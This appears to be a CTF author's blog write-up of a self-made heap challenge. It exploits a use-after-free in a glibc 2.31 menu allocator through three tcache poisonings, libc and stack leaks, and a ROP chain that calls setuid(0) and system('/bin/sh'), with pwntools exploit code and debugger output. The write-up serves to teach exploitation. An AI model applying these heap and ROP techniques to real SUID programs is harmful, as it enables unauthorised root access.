---
layout: post
title: "heap-uaf-rop :))"
date: 2025-05-17
tags: ["2025", "pwn", "archive", "heap"]
summary: "Heap UAF to tcache poisoning to stack ROP: all mitigations enabled, glibc 2.31"
---

# Heap Use-After-Free: Tcache Poisoning to ROP

I created this heap challenge recently. It uses a classic menu-based allocator with alloc, free, view, and edit operations. The exploitation path was interesting(atleast for me) enough to write up(pretty much extensively).

This differs a little bit from the usual heap challenges because **every mitigation is enabled**: Full RELRO, PIE, Canary, NX, and FORTIFY. There are no shortcuts. The GOT cannot be overwritten, the stack cannot be smashed directly, and even `__free_hook` (which exists in glibc 2.31) does not work cleanly because of the SUID privilege situation. The chain is: heap leak --> tcache poison --> fake chunk --> unsorted bin --> libc leak --> environ --> stack leak --> ROP. It uses three separate tcache poisons.

## the binary

The setup:

```
$ file challenge
challenge: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec challenge
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

The binary was compiled on Ubuntu 20.04 with glibc 2.31. The Dockerfile uses:

```bash
gcc -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2 \
    -O2 -Wformat -Wformat-security -Werror=format-security -o challenge challenge.c
```

full RELRO means no GOT overwrites. so we're gonna need another way to get code execution.

## reversing

binary is not stripped so the function names are right there. after throwing it into the disassembler:

**the allocs array**

There is a global `allocs` array in BSS at `0x4060`, 1600 bytes total. Each entry is 16 bytes: 8 for the chunk pointer and 8 for the size. That gives 100 slots.

```c
struct slot {
    void *ptr;
    size_t size;
} allocs[100];
```

**init()**


```c
uid_t euid = geteuid();
setreuid(euid, -1);
```

This sets the real UID to the effective UID. If the binary is SUID root, both ruid and euid become 0.

**alloc_chunk()**

The function finds the first slot with a zero size field, calls `malloc(0x30)`, stores the pointer, and sets the size to `0x30`. Every allocation is therefore 0x30 bytes, producing 0x40-size tcache chunks (0x30 user data plus 0x10 metadata).

**free_chunk()**

this is where the bug lives. let me just show the disassembly:

```asm
free_chunk:
    ...
    call   free@plt                ; free(allocs[idx].ptr)
    mov    qword [rbx+0x8], 0x0    ; allocs[idx].size = 0
    ...
```

it frees the chunk and zeros the **size** field. but it never NULLs out the **pointer**. that pointer is still sitting there pointing at freed memory.

**view_chunk()**

```asm
view_chunk:
    ...
    mov    rsi, [rdx+rax]        ; rsi = allocs[idx].ptr
    test   rsi, rsi              ; if (ptr != NULL)
    je     invalid
    mov    edx, 0x30             ; write 0x30 bytes
    mov    edi, 1                ; fd = stdout
    call   write@plt             ; write(1, ptr, 0x30)
```

it checks `if (ptr != NULL)`, but since free doesn't NULL the pointer, this check passes on freed chunks. we can read 0x30 bytes of freed heap data. **UAF read**.

**edit_chunk()**

```asm
edit_chunk:
    ...
    cmp    qword [rbx], 0x0      ; if (allocs[idx].ptr != NULL)
    je     invalid
    ...
    mov    rsi, [rbx]             ; rsi = allocs[idx].ptr
    mov    edx, 0x2f              ; read 0x2f bytes
    xor    edi, edi               ; fd = stdin
    call   read@plt               ; read(0, ptr, 0x2f)
```

It checks the pointer, not the size, so we can write 0x2f bytes to freed memory. **UAF write**.

## the bug

In short, `free_chunk` zeros the size but does not NULL the pointer. `view` and `edit` only check the pointer, giving us a RW primitive on freed chunks.

## exploitation strategy

with UAF on tcache chunks in glibc 2.31, the plan is:

1. **leak the heap**: read the tcache forward pointer from a freed chunk
2. **tcache poisoning**: overwrite the FD pointer to get an overlapping allocation
3. **forge a fake large chunk**: make the allocator think a chunk is big enough for the unsorted bin
4. **leak libc**: free the fake chunk into the unsorted bin and read the FD/BK pointers into `main_arena`
5. **leak the stack**: tcache poison to read `libc.environ`
6. **ROP**: tcache poison to write a ROP chain to the stack return address

The steps are below.

## heap leak

```python
alloc()   # slot 0
alloc()   # slot 1
alloc()   # slot 2

free_slot(0)
free_slot(1)
```

tcache bin for 0x40 now looks like: `chunk1 --> chunk0`

chunk1's user data starts with the FD pointer to chunk0. since the pointer in `allocs[1]` was never cleared:

```python
heap = view(1)
heap = u64(heap[:8].ljust(8, b"\x00"))
log.info(f"Heap leak: {hex(heap)}")
```

We now have a heap address, specifically the address of chunk0.

## tcache poisoning for overlapping chunks

now we poison chunk1's FD pointer to point inside chunk2's data area:

```python
edit(1, p64(heap + 0x70))
```

`heap + 0x70` lands right at the start of chunk2's user data. tcache now thinks the chain is: `chunk1 --> (heap+0x70)`

```python
alloc()           # pops chunk1 from tcache
chunk_4 = alloc() # pops the fake entry at heap+0x70, overlapping with chunk2
```

we now have a chunk (`chunk_4`) that overlaps with chunk2. anything we write there overwrites chunk2's metadata.

## forge a fake large chunk

we write a fake chunk header at the overlapping position:

```python
edit(chunk_4, p64(0) + p64(0x501))
```

this sets chunk2's `prev_size` to 0 and `size` to 0x501. the allocator now thinks chunk2 is a 0x500-byte chunk. that's way bigger than the tcache max (0x410 for glibc 2.31), so when we free it, it goes into the **unsorted bin** instead of tcache.

but we need the memory after this fake chunk to look valid, so we fill it:

```python
for i in range(0x500 // 0x40):   # 20 allocations
    alloc()
alloc()  # one more to act as a top chunk boundary
```

## libc leak

```python
free_slot(2)
```

Chunk2, now with fake size 0x501, gets put into the unsorted bin. The unsorted bin is a doubly-linked list. Its FD and BK pointers now point to `main_arena + 96` inside libc.

```python
libc_leak = view(2)
libc_leak = u64(libc_leak[:8].ljust(8, b"\x00"))
libc.address = libc_leak - 0x1ecbe0
log.info(f'libc leak: {hex(libc_leak)}')
```

the offset `0x1ecbe0` is `main_arena + 96` for this specific glibc 2.31 build. you can verify:

```
__malloc_hook  = 0x1ecb70
main_arena     = __malloc_hook + 0x10 = 0x1ecb80
unsorted_bin   = main_arena + 0x60   = 0x1ecbe0
```

## why not __free_hook?

glibc 2.31 still has `__free_hook` (at offset `0x1eee48`). you might think the easy play is:

```python
# tcache poison --> write system() to __free_hook
# free a chunk containing "/bin/sh" --> system("/bin/sh")
```

I tried this first, as shown in the commented code. The problem is that this binary is SUID and uses `setreuid()` in init. When `system()` spawns `/bin/sh`, the shell checks whether ruid != euid and drops privileges. Even though init sets ruid = euid, SUID shell behavior can still cause problems.

so instead, we go for a ROP chain that explicitly calls `setuid(0)` before `system("/bin/sh")`.

## stack leak

to write a ROP chain, we need to know where the stack is. libc has a global pointer `environ` that points to the environment variables on the stack.

```python
alloc()
idx = alloc()
alloc()
free_slot(int(idx) + 1)
free_slot(idx)

edit(idx, p64(libc.symbols.environ))
alloc()
stack_leak_idx = alloc()  # this chunk is at &environ

stack_leak = view(stack_leak_idx)
stack_leak = u64(stack_leak[:8].ljust(8, b"\x00"))
log.info(f'Stack leak: {hex(stack_leak)}')
```

The same tcache poisoning technique frees two chunks, overwrites the FD of the second-freed chunk to point to `environ`, and allocates twice. The second allocation is at `environ`, which lets us read the stack pointer.

## ROP chain

from the debugger, the offset from `environ` to main's return address on the stack is `0x150`:

```
pwndbg> x/gx &environ
0x7e9bb36bd600 <environ>:       0x00007ffee19962b8

pwndbg> tele 0x00007ffee19962b8-0x150 10
00:0000│ rsp     0x7ffee1996168 -> 0x55c9ad2af1a6 (main+102) <- test rax, rax
```

so:

```python
ret_addr = stack_leak - 0x150
```

The ROP chain calls `setuid(0)` before `system("/bin/sh")`:

```python
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\0'))

rop.raw(pop_rdi)
rop.raw(0)
rop.raw(libc.symbols.setuid)
rop.raw(pop_rdi)
rop.raw(binsh)
rop.raw(libc.symbols.system)

chain = rop.chain()
```

one final tcache poison to write the ROP chain to the return address:

```python
poison = int(alloc())
alloc()
alloc()
free_slot(poison)
free_slot(poison + 1)
free_slot(poison + 2)

edit(poison + 1, p64(ret_addr))  # poison FD --> stack return address

poison = int(alloc())
alloc()
alloc()                          # this chunk lands on the stack

edit(poison + 2, chain)          # overwrite return address with ROP chain
```

when main returns, it pops our ROP chain off the stack:

```
setuid(0) --> system("/bin/sh")
```

## exploit

[Full exploit](https://github.com/GiridharPrasath/ctf/blob/master/pwn/heap-uaf-tcache-rop/exploit.py)

Triacontakai solved the privilege issue with an `execl` trick, likely using `execl("/bin/sh", "sh", "-p", NULL)` to keep the shell privileged. This could be mitigated by blocking `execve` and `execveat` with seccomp, but it was a nice trick :))